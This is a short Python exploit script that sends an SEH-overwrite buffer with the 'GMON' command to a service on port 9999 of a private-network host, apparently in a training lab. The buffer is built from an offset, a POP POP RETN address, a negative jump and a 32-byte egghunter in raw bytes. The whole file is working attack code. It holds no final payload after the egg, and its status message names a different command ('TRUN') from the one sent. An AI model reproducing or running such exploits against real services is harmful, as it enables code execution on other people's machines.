#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

#Where \x77\x30\x30\x74 = w00t (egg)

buffer="GMON /.:/" + "w00tw00t" + "A"*3447 + "\x90"*8 + egghunter + "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

